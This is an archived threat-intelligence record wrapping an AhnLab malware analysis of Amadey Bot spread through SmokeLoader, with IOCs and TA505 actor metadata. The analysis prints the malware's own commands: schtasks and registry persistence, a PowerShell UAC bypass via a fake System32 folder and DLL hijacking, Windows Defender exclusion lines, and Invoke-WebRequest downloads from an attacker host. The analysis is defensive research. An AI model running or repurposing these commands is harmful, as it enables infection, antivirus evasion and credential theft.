{
    "id": "5269a526-6712-477d-9b02-f4d2b9de8f5c",
    "created_at": "2023-04-05T02:09:06.588251Z",
    "updated_at": "2025-03-27T02:15:37.977367Z",
    "deleted_at": null,
    "sha1_hash": "568e6a874d673aa4ef7f16f8f7b698d44da64b54",
    "title": "2022-07-21 - Amadey Bot Being Distributed Through SmokeLoader",
    "authors": "",
    "file_creation_date": "2023-04-03T08:30:47Z",
    "file_modification_date": "2023-04-03T08:30:47Z",
    "file_size": 2889004,
    "plain_text": "# Amadey Bot Being Distributed Through SmokeLoader\n\n**asec.ahnlab.com/en/36634/**\n\nBy Sanseo July 21, 2022\n\nAmadey Bot, a malware that was first discovered in 2018, is capable of stealing information\nand installing additional malware by receiving commands from the attacker. Like other\nmalware strains, it has been sold in illegal forums and used by various attackers.\n\nThe ASEC analysis team previously revealed cases where Amadey was used on attacks in\nthe ASEC blog posted in 2019 (English version unavailable). Amadey was mainly used to\ninstall ransomware by attackers of GandCrab or to install FlawedAmmyy by the TA505 group\n[that is infamous for Clop ransomware. The attackers of Fallout Exploit Kit and](https://www.malware-traffic-analysis.net/2019/02/28/index.html) **Rig Exploit**\n**Kit are also known for using Amadey.**\n\nThe team has recently discovered that Amadey is being installed by SmokeLoader.\nSmokeLoader is a malware that has continuously been distributed during the last few years,\ntaking up high proportion in the recent ASEC statistics. It is recently distributed by having\nusers download the malware that is disguised as software cracks and serial generation\nprograms from websites for distribution.\n\n**[SmokeLoader provides various additional features related to info-stealing as plug-ins. It is](https://image.ahnlab.com/file_upload/asecissue_files/ASEC%20REPORT_vol.101.pdf)**\nnormally used to install additional malware strains as a downloader. When SmokeLoader is\nrun, it injects Main Bot into the currently running explorer process (explorer.exe). This means\n\n\n-----\n\nBot that performs actual malicious behaviors operates inside the explorer process. The figure\nbelow shows AhnLab’s ASD log of SmokeLoader, which has been injected into explorer,\ndownloading Amadey.\n\nFigure 1. Amadey downloaded through SmokeLoader injected into the explorer process\nWhen Amadey is run, it first copies itself to the Temp path below. Then, Amadey registers the\nfolder where it exists as a startup folder to allow itself to be run after reboot. It also provides a\nfeature to register itself to Task Scheduler to maintain persistence.\n\n**Amadey Installation Path**\n\n  - %TEMP%\\9487d68b99\\bguuwe.exe\n\n**Command registered to Task Scheduler**\n\n  - cmd.exe /C REG ADD\n“HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders” /f /v\nStartup /t REG_SZ /d %TEMP%\\9487d68b99\\\n\n  - schtasks.exe /Create /SC MINUTE /MO 1 /TN bguuwe.exe /TR\n“%TEMP%\\9487d68b99\\bguuwe.exe” /F\n\nFigure 2. Amadey shown on AhnLab’s ASD log\nAfter going through the process mentioned above, the malware starts communicating with\nthe C&C server. The following Fiddler log shows Amadey communicating with the C&C\nserver, downloading the cred.dll plug-in to collect user environment information and send aos\n매to the C&C server, and installing RedLine info-stealer as an additional malware strain.\n\n\n-----\n\nFigure 3. Amadey’s network traffic\nThe malware collects the information of the infected system before it connects to the C&C\nserver. The information collected includes basic information such as computer name and\nuser name, as well as a list of installed anti-malware products. Each part of the collected\ninformation is sent to the C&C server in an appropriate format. The server then can send the\nURL of additional malware strains that Amadey will download to make it operate as a\ndownloader.\n\nFigure 4. Data sent to\n\nthe C&C server and data received from the C&C server\n\n**Item** **Data Example** **Meaning**\n\nid 129858768759 Infected system’s ID\n\nvs 3.21 Amadey version\n\nsd 37bbd7 Amadey ID\n\n\n-----\n\n**Item** **Data Example** **Meaning**\n\nos 9 Windows version\n\nex) Windows 7 – 9\n\nWindows 10 – 1\n\nWindows Server 2012 – 4\n\nWindows Server 2019 – 16\n\nbi 0 Architecture (x86 – 0, x64 – 1)\n\nar 0 Admin privilege status (1 if admin privilege is available)\n\npc PCNAME Computer name\n\nun USERNAME User name\n\ndm DOMAINNAME Domain name\n\nav 0 List of installed anti-malware\n\nlv 0 Set as 0\n\nog 1 Set as 1\n\nTable 1. Data sent to the C&C server\nThe table above indicates that the current version of Amadey discussed in this post is 3.21.\nAccessing the C&C panel of the current Amadey version under analysis shows how the\ncurrent version is slightly different from the previous one.\n\n\n-----\n\nFigure 5. Previous Amadey C&C panel login page\n\n\n-----\n\nFigure 6. Latest Amadey C&C panel login page\nAmong items sent to the C&C server, “av” refers to the information of anti-malware installed\non the infected environment. Each number is assigned to a particular anti-malware product.\nAs ’13’ is chosen if the infected environment is Windows 10 or Windows Server 2019, it is\nlikely the number is reserved for Windows Defender.\n\n**Anti-malware Name** **Number**\n\nX 0\n\nAvast Software 1\n\nAvira 2\n\nKaspersky Lab 3\n\nESET 4\n\nPanda Security 5\n\nDr. Web 6\n\nAVG 7\n\n\n-----\n\n**Anti-malware Name** **Number**\n\n360 Total Security 8\n\nBitdefender 9\n\nNorton 10\n\nSophos 11\n\nComodo 12\n\nWindows Defender (assumed) 13\n\nTable 2. List of anti-malware for checking\nAmadey also periodically takes screenshots and sends them to the C&C server. It captures\nthe current screen in a JPG format and saves it with the name “129858768759” in the\n%TEMP% path. The screenshot is later sent to the C&C server with the POST method.\n\nFigure 7. Sending screenshots to the C&C server\nThe network traffic figure shown above has “cred.dll”, meaning the malware downloaded a\nplug-in for stealing information. The plug-in developed with the Delphi programming\nlanguage is downloaded to the %APPDATA% path. It is then run through rundll32.exe as\nhaving the Export function Main() as an argument as shown below.\n\n  - rundll32.exe %APPDATA%\\406d6c22b040c6\\cred.dll, Main\n\nThe list of information that is stolen includes emails, FTPs, VPN clients, etc. The information\ncollected is sent to the same C&C server.\n\n\n-----\n\n**List of information targeted for info-stealing plug-in**\n– Mikrotik Router Management Program Winbox\n– Outlook\n\n– FileZilla\n\n– Pidgin\n\n– Total Commander FTP Client\n\n– RealVNC, TightVNC, TigerVNC\n\n– WinSCP\n\nThe Fiddler log mentioned above shows how Amadey installed additional malware from\n“hxxp://185.17.0[.]52/yuri.exe” besides the cred.dll plug-in. When Amadey periodically\ncommunicates with the C&C server to send the information of the infected system, the server\nusually sends the NULL data back. However, it can send a downloader command depending\non the command. The downloader command is sent with encoded data, and decoding it will\nallow the malware to receive an URL for downloading additional malware. The malware\ndownloaded from the URL is RedLine info-stealer.\n\nFigure 8. RedLine info-stealer being installed by Amadey\nAccessing “hxxp://185.17.0[.]52/” shows a list of files.\n\n\n-----\n\nFigure 9. A webpage for Amadey to download\nThe table below explains each file. They include Amadey, RedLine, and downloader malware\ntypes used to install them.\n\n**Name** **Type**\n\nProxy.exe Autoit downloader malware\n\na.exe Amadey (unpacked original version)\n\nama.exe Amadey (NULL data added to a.exe)\n\nau.exe Amadey (packed)\n\nbin Amadey downloader (x64 DLL)\n\nxyz.exe Downloader (installs bin)\n\nyuri.exe RedLine info-stealer\n\nTable 3. List of malware strains\nxyz.exe and bin, which are downloader malware types, are developed with the Rust\nprogramming language. xyz.exe downloads bin and supports privilege escalation using the\nUAC bypass technique. The technique exploits AutoElevate and the mechanisms of AIS.\n\n\n-----\n\nAutoElevate is a program with the <autoElevate>true</autoElevate> property as shown\nbelow. If certain conditions are met, it can be run as admin privilege without a UAC pop-up.\n\nFigure 10.\n\nFXSUNATD.exe with the AutoElevate property\nTo do so, the program needs to be run in a trusted location such as System32 besides the\nproperty mentioned above. Hence the malware created the “C:\\Windows \\System32\\” folder\nas shown below and copied “FXSUNATD.exe” (AutoElevate program) to satisfy the\ncondition. AIS ignores spacings when internally checking paths. So if “FXSUNATD.exe” is\nrun in the path mentioned earlier, it is recognized as being executed from a normal System32\npath. The path check is successful and the program is run as AutoElevate (admin privilege).\n\n   - powershell.exe “New-Item -ItemType Directory ‘\\?\\C:\\Windows \\System32’; CopyItem -Path ‘C:\\Windows\\System32\\FXSUNATD.exe’ -Destination ‘C:\\Windows\n\\System32\\’; powershell -windowstyle hidden $ProgressPreference= ‘SilentlyContinue’;\nInvoke-WebRequest hxxp://185.17.0[.]52/bin -Outfile ‘C:\\Windows\n\\System32\\version.dll'”\n\n  - powershell.exe “Start-Process ‘C:\\Windows \\System32\\FXSUNATD.exe'”\n\nThe malware then downloads a malicious DLL named version.dll in the same path.\nversion.dll is a DLL used by “FXSUNATD.exe”. If the file is in the same path as\n“FXSUNATD.exe”, the DLL is executed first following the DLL load order when the exe\nprogram is run. The process is called DLL hijacking. By exploiting this mechanic, the\nmalware loaded on a normal program is executed as “FXSUNATD.exe” is run after the\nmalicious DLL (version.dll) is created in the same path.\n\nFigure 11. Process tree of Amadey downloader\nbin (version.dll) loaded and executed by “FXSUNATD.exe” is a downloader that installs\nAmadey and RedLine. When it is run, it uses the Windows Defender command to register\nthe %ALLUSERSPROFILE% folder and %LOCALAPPDATA% directory that includes the\nTemp directory as exclusions It then downloads and runs each malware type\n\n\n-----\n\n  - powershell -windowstyle hidden Add-MpPreference -ExclusionPath\nC:\\ProgramData\\; Add-MpPreference -ExclusionPath $env:TEMP\\; Add-MpPreference\n-ExclusionPath $env:LOCALAPPDATA\\\n\n  - powershell -windowstyle hidden Invoke-WebRequest -Uri\nhxxp://185.17.0[.]52/yuri.exe -OutFile $env:TEMP\\msconfig.exe;\n\n  - powershell -windowstyle hidden Invoke-WebRequest -Uri\nhxxp://185.17.0[.]52/ama.exe -OutFile $env:TEMP\\taskhost.exe\n\nInitially distributed through exploit kits in the past, Amadey has been installed through\nSmokeLoader from malicious websites disguised as download pages for cracks and serials\nof commercial software until recently. Once the malware is installed, it can stay in the system\nto steal user information and download additional payloads. Users should apply the latest\npatch for OS and programs such as Internet browsers, and update V3 to the latest version to\nprevent malware infection in advance.\n\nAhnLab’s anti-malware software, V3, detects and blocks the malware above using the\naliases below.\n\n**[File Detection]**\n\n– Trojan/Win.MalPE.R503126 (2022.07.07.01)\n\n– Trojan/Win.Amadey.C5196504 (2022.07.07.02)\n\n– Trojan/Win.Delf.R462350 (2022.01.04.02)\n\n– Trojan/Win.Generic.R503640 (2022.07.09.01)\n\n– Downloader/Win.AutoIt.C5200737 (2022.07.11.00)\n\n– Malware/Win.Trojanspy.R438708 (2021.08.25.01)\n\n– Trojan/Win.Amadey.C5200739 (2022.07.11.00)\n\n– Downloader/Win.Agent.C5198969 (2022.07.10.00)\n\n– Downloader/Win.Agent.C5198968 (2022.07.10.00)\n\n**[Behavior Detection]**\n\n– Malware/MDP.Download.M1197\n\n– Execution/MDP.Powershell.M2514\n\n**[IOC]**\n\n**MD5**\n\n– c3b7cf4c76cc20e56b180b001535696f (SmokeLoader)\n\n– 6a87b10b372f64f7890def6fbaf08bfc (bguuwe.exe: Amadey)\n\n– 77ce635ba7fb55f0c844077fee828ce7 (cred.dll: Stealer Plugin)\n\n– 0f4351c43a09cb581dc01fe0ec08ff83 (yuri.exe: RedLine)\n\n– 600bb5535d0bfc047f5c61f892477045 (Proxy.exe: Autoit downloader)\n\n– 18bb226e2739a3ed48a96f9f92c91359 (a.exe: Amadey – unpacked original version)\n– 27f626db46fd22214c1eb6c63193d2a0 (ama.exe: Amadey – NULL data added to a.exe)\n\n\n-----\n\n– 977697e93a3b2635a5b8fb7dc3dfaf6b (au.exe: Amadey – packed)\n– f0cdfc42f1c1c0c2d9b518e5cb31c788 (bin: Amadey downloader – x64 DLL)\n\n– 0fd121b4a221c7767bd58f49c3d7cda5 (xyz.exe: Downloader – installs bin)\n\n**Download URL**\n\n– hxxp://185.17.0[.]52/yala.exe (Amadey)\n\n– hxxp://authymysexy[.]info/5Lsq3FR/Plugins/cred.dll (Stealer Plugin)\n\n– hxxp://185.17.0[.]52/yuri.exe (RedLine)\n\n– hxxp://185.17.0[.]52/Proxy.exe (Autoit downloader malware)\n\n– hxxp://185.17.0[.]52/a.exe (Amadey – unpacked original version)\n\n– hxxp://185.17.0[.]52/ama.exe (Amadey – NULL data added to a.exe)\n\n– hxxp://185.17.0[.]52/au.exe (Amadey – packed)\n\n– hxxp://185.17.0[.]52/bin (Amadey downloader – x64 DLL)\n\n– hxxp://185.17.0[.]52/xyz.exe (Downloader – installs bin)\n\n**C2**\n\n– hxxp://host-file-host6[.]com (SmokeLoader)\n\n– hxxp://host-host-file8[.]com (SmokeLoader)\n\n– hxxp://teamfighttacticstools[.]info/5Lsq3FR/index.php (Amadey)\n\n– hxxp://authymysexy[.]info/5Lsq3FR/index.php (Amadey)\n\n– hxxp://nftmatrixed[.]info/5Lsq3FR/index.php (Amadey)\n\n– 185.17.0[.]63:34397 (RedLine)\n\n**Subscribe to AhnLab’s next-generation threat intelligence platform ‘AhnLab TIP’ to**\n**check related IOC and detailed analysis information.**\n\n[Categories:Malware Information](https://asec.ahnlab.com/en/category/malware-information-en/)\n\n[Tagged as:Amadey,crack,Downloader,InfoStealer,SmokeLoader,UACBypass](https://asec.ahnlab.com/en/tag/amadey-en/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-07-21 - Amadey Bot Being Distributed Through SmokeLoader.pdf"
    ],
    "report_names": [
        "2022-07-21 - Amadey Bot Being Distributed Through SmokeLoader.pdf"
    ],
    "threat_actors": [
        {
            "id": "99cb4e5b-8071-4f9e-aa1d-45bfbb6197e3",
            "created_at": "2023-01-06T13:46:38.860754Z",
            "updated_at": "2025-03-27T02:00:02.937438Z",
            "deleted_at": null,
            "main_name": "TA505",
            "aliases": [
                "SectorJ04 Group",
                "Dudear",
                "G0092",
                "ATK103",
                "Hive0065",
                "Spandex Tempest",
                "GRACEFUL SPIDER",
                "GOLD TAHOE",
                "CHIMBORAZO",
                "SectorJ04"
            ],
            "source_name": "MISPGALAXY:TA505",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "5e6b31a6-80e3-4e7d-8b0a-d94897ce9b59",
            "created_at": "2024-06-19T02:03:08.128175Z",
            "updated_at": "2025-03-27T02:05:17.400394Z",
            "deleted_at": null,
            "main_name": "GOLD TAHOE",
            "aliases": [
                "SectorJ04 ",
                "Spandex Tempest ",
                "TA505 ",
                "FIN11 "
            ],
            "source_name": "Secureworks:GOLD TAHOE",
            "tools": [
                " Cobalt Strike",
                " FlawedAmmy",
                " Get2",
                " GraceWire",
                " Malichus",
                " SDBbot",
                " ServHelper",
                " TrueBot",
                "Clop"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "75d4d6a9-b5d1-4087-a7a0-e4a9587c45f4",
            "created_at": "2022-10-25T15:50:23.5188Z",
            "updated_at": "2025-03-27T02:00:55.489882Z",
            "deleted_at": null,
            "main_name": "TA505",
            "aliases": [
                "TA505",
                "Hive0065",
                "Spandex Tempest",
                "CHIMBORAZO"
            ],
            "source_name": "MITRE:TA505",
            "tools": [
                "AdFind",
                "Azorult",
                "FlawedAmmyy",
                "Mimikatz",
                "Dridex",
                "TrickBot",
                "Get2",
                "FlawedGrace",
                "Cobalt Strike",
                "ServHelper",
                "Amadey",
                "SDBbot",
                "PowerSploit"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "e447d393-c259-46e2-9932-19be2ba67149",
            "created_at": "2022-10-25T16:07:24.28282Z",
            "updated_at": "2025-03-27T02:02:10.159466Z",
            "deleted_at": null,
            "main_name": "TA505",
            "aliases": [
                "ATK 103",
                "Chimborazo",
                "Gold Evergreen",
                "Gold Tahoe",
                "Graceful Spider",
                "Hive0065",
                "Operation Tovar",
                "Operation Trident Breach",
                "SectorJ04",
                "Spandex Tempest",
                "TA505",
                "TEMP.Warlock"
            ],
            "source_name": "ETDA:TA505",
            "tools": [
                "Amadey",
                "AmmyyRAT",
                "AndroMut",
                "Azer",
                "Bart",
                "Bugat v5",
                "CryptFile2",
                "CryptoLocker",
                "CryptoMix",
                "CryptoShield",
                "Dridex",
                "Dudear",
                "EmailStealer",
                "FRIENDSPEAK",
                "Fake Globe",
                "Fareit",
                "FlawedAmmyy",
                "FlawedGrace",
                "FlowerPippi",
                "GOZ",
                "GameOver Zeus",
                "GazGolder",
                "Gelup",
                "Get2",
                "GetandGo",
                "GlobeImposter",
                "Gorhax",
                "GraceWire",
                "Gussdoor",
                "Jaff",
                "Kasidet",
                "Kegotip",
                "Kneber",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Locky",
                "MINEBRIDGE",
                "MINEBRIDGE RAT",
                "MirrorBlast",
                "Neutrino Bot",
                "Neutrino Exploit Kit",
                "P2P Zeus",
                "Peer-to-Peer Zeus",
                "Philadelphia",
                "Philadephia Ransom",
                "Pony Loader",
                "Rakhni",
                "ReflectiveGnome",
                "Remote Manipulator System",
                "RockLoader",
                "RuRAT",
                "SDBbot",
                "ServHelper",
                "Shifu",
                "Siplog",
                "TeslaGun",
                "TiniMet",
                "TinyMet",
                "Trojan.Zbot",
                "Wsnpoem",
                "Zbot",
                "Zeta",
                "ZeuS",
                "Zeus"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1680660546,
    "ts_updated_at": 1743041737,
    "ts_creation_date": 1680510647,
    "ts_modification_date": 1680510647,
    "files": {
        "pdf": "https://archive.orkl.eu/568e6a874d673aa4ef7f16f8f7b698d44da64b54.pdf",
        "text": "https://archive.orkl.eu/568e6a874d673aa4ef7f16f8f7b698d44da64b54.txt",
        "img": "https://archive.orkl.eu/568e6a874d673aa4ef7f16f8f7b698d44da64b54.jpg"
    }
}